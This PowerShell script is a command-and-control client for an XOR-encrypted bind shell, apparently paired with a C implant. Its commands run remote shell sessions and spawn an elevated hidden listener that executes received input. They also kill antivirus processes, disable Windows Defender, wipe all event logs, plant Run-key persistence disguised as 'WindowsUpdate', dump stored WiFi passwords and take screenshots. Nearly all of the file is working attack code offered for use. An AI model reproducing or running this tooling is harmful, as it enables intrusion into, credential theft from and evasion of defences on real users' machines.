param(
    [string]$Ip = "127.0.0.1",
    [int]$Port = 54321
)

# XOR key (must match main.c)
$xorKey = @(0x42,0x7A,0x1F,0xE3,0x9C,0x55,0xB0,0x2D)
function xor-buf { param([byte[]]$b) for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $xorKey[$i%$xorKey.Length]} }

$gSock = $null; $gStream = $null
$gBuild = 0; $gElev = 0

function connect-to {
    try {
        $c = New-Object System.Net.Sockets.TcpClient($Ip, $Port)
        $s = $c.GetStream()
        Write-Host "[+] Connected to $Ip`:$Port" -ForegroundColor Green
        return @{Client=$c; Stream=$s}
    } catch { Write-Host "[-] Connect failed: $_" -ForegroundColor Red; return $null }
}

function send-cmd {
    param([string]$cmd)
    if (-not $gStream) { Write-Host "[-] Not connected" -ForegroundColor Red; return }
    $data = [Text.Encoding]::ASCII.GetBytes("$cmd`r`necho __C2DONE__`r`n")
    xor-buf $data
    $gStream.Write($data,0,$data.Length)
}

function recv-until {
    if (-not $gStream) { return "" }
    $buf = New-Object byte[] 1; $out = New-Object System.Text.StringBuilder
    $sw = [Diagnostics.Stopwatch]::StartNew()
    while ($sw.Elapsed.TotalSeconds -lt 10) {
        if ($gStream.DataAvailable) {
            $n = $gStream.Read($buf,0,1)
            if ($n -le 0) { break }
            xor-buf $buf; [char]$c = $buf[0]
            if ($c -eq "__C2DONE__"[0]) {
                # Check for marker
                $marker = "__C2DONE__"
                $current = $out.ToString()
                $idx = $current.IndexOf($marker)
                if ($idx -ge 0) { return $current.Substring(0, $idx) }
            }
            $out.Append($c) | Out-Null
        } else { Start-Sleep -Milliseconds 50 }
    }
    return $out.ToString().Trim()
}

function xcmd {
    param([string]$cmd)
    send-cmd $cmd
    $result = recv-until
    if ($result) { $result -split "`r`n" | Where-Object {$_} | ForEach-Object { Write-Host $_ } }
    else { Write-Host "[-] No response" -ForegroundColor Red }
}

# Command dispatcher
$cmdHandlers = @{}

function reg-cmd { param($name, $desc, $fn) $cmdHandlers[$name] = @{Desc=$desc; Fn=$fn} }

reg-cmd "help" "Show help" { param($a)
    Write-Host "Commands:"
    $cmdHandlers.Keys | Sort-Object | ForEach-Object { Write-Host ("  {0,-15} {1}" -f $_, $cmdHandlers[$_].Desc) }
}

reg-cmd "connect" "Connect <ip> [port]" { param($a)
    $ip = if ($a.Count -ge 2) { $a[1] } else { $Ip }
    $port = if ($a.Count -ge 3) { [int]$a[2] } else { $Port }
    $r = connect-to $ip $port
    if ($r) { $global:gSock = $r.Client; $global:gStream = $r.Stream }
}

reg-cmd "disconnect" "Disconnect" { param($a)
    if ($gSock) { $gSock.Close() }
    $global:gSock = $null; $global:gStream = $null
    Write-Host "Disconnected" -ForegroundColor Yellow
}

reg-cmd "sysinfo" "System info" { param($a) xcmd "`$b=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion').CurrentBuild;`$r=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion').DisplayVersion;`$u=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion').UBR;Write-Output (""BUILD=""+`$b);Write-Output (""VER=""+`$r);Write-Output (""UBR=""+`$u);Write-Output (""ARCH=""+`$env:PROCESSOR_ARCHITECTURE);`$il=whoami /groups|findstr 'S-1-16-';if(`$il -match '12288'){Write-Output 'ELEV=ADMIN'}elseif(`$il -match '16384'){Write-Output 'ELEV=SYSTEM'}else{Write-Output 'ELEV=USER'}" }
reg-cmd "ps" "Process list" { param($a) xcmd "Get-Process | Select-Object -First 60 Name,Id,CPU | Format-Table -AutoSize" }
reg-cmd "shell" "Interactive PS shell" { param($a) Write-Host "Type commands directly (type 'exit' to quit shell):" -ForegroundColor Cyan
    while ($true) {
        $c = Read-Host "PS> "
        if ($c -eq "exit" -or $c -eq "quit") { break }
        xcmd $c
    }
}
reg-cmd "cmd" "Run single command" { param($a)
    if ($a.Count -lt 2) { Write-Host "Usage: cmd <command>"; return }
    xcmd ($a[1..($a.Count-1)] -join " ")
}
reg-cmd "escalate" "UAC bypass" { param($a) xcmd "Start-Process 'powershell' -Verb RunAs -ArgumentList '-NoP -NonI -W Hidden -c `$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('0.0.0.0'),54322);`$l.Start();while(1){`$c=`$l.AcceptTcpClient();`$s=`$c.GetStream();while(1){`$b=New-Object byte[] 2048;`$n=`$s.Read(`$b,0,2048);if(`$n-le0)break;`$r=(iex([Text.Encoding]::ASCII.GetString(`$b,0,`$n))2>&1|Out-String);`$x=[Text.Encoding]::ASCII.GetBytes(`$r+'PS> ');`$s.Write(`$x,0,`$x.Length)|Out-Null}}'" }
reg-cmd "closewindows" "Close all windows" { param($a) xcmd "(New-Object -ComObject Shell.Application).Windows() | ForEach-Object { `$_.Quit() }" }
reg-cmd "killav" "Kill AV processes" { param($a) xcmd "Get-Process | Where-Object { `$_.Name -match 'huorong|360|txplatform|ksoft|kav|avp|bdagent|mcshield|MsMpEng' } | Stop-Process -Force" }
reg-cmd "disabledefender" "Disable Defender" { param($a) xcmd "Set-MpPreference -DisableRealtimeMonitoring `$true -DisableBehaviorMonitoring `$true -DisableBlockAtFirstSeen `$true -DisableIOAVProtection `$true; New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -Force" }
reg-cmd "clearlogs" "Clear event logs" { param($a) xcmd "wevtutil el | ForEach-Object { wevtutil cl `"`$_`" }" }
reg-cmd "persist" "Install persistence" { param($a) xcmd "`$p=Get-Process -Id `$pid | Select-Object -ExpandProperty Path;New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value `$p -Force" }
reg-cmd "wifi" "Dump WiFi passwords" { param($a) xcmd "(netsh wlan show profiles) | Select-String ':' | ForEach-Object { `$p=`$_.ToString().Split(':')[1].Trim(); netsh wlan show profile name=`$p key=clear } | Select-String 'Key Content|Profile'" }
reg-cmd "screenshot" "Take screenshot" { param($a) xcmd "Add-Type -AssemblyName System.Drawing;`$s=[Drawing.Rectangle]::FromLTRB(0,0,[int]([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width),[int]([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height));`$b=new-object Drawing.Bitmap `$s.Width,`$s.Height;`$g=[Drawing.Graphics]::FromImage(`$b);`$g.CopyFromScreen(0,0,0,0,`$s.Size);`$b.Save('$env:TEMP\scr.png');Write-Output 'Saved to '+`$env:TEMP+'\scr.png'" }
reg-cmd "exit" "Exit" { param($a) if ($gSock) { $gSock.Close() }; exit }

function tokenize { param([string]$s)
    $parts = @(); $i=0; $inQ=$false; $cur=""
    while ($i -lt $s.Length) {
        $c = $s[$i]
        if ($c -eq '"') { $inQ = -not $inQ }
        elseif ($c -eq ' ' -and -not $inQ) { if ($cur) { $parts += $cur; $cur="" } }
        else { $cur += $c }
        $i++
    }
    if ($cur) { $parts += $cur }
    return ,$parts
}

Write-Host "C2 Client (PowerShell) — XOR encrypted bind shell controller" -ForegroundColor Cyan
Write-Host "Type 'help' for commands`n" -ForegroundColor Gray

# Auto-connect
$r = connect-to
if ($r) { $global:gSock = $r.Client; $global:gStream = $r.Stream }

while ($true) {
    $p = if ($gStream) { "c2[$Ip`:$Port]> " } else { "c2> " }
    $input = Read-Host $p
    $parts = tokenize $input
    if ($parts.Count -eq 0) { continue }
    $cmd = $parts[0].ToLower()
    if ($cmdHandlers.ContainsKey($cmd)) {
        & $cmdHandlers[$cmd].Fn $parts
    } else {
        Write-Host "Unknown: $cmd (type 'help')" -ForegroundColor Red
    }
}
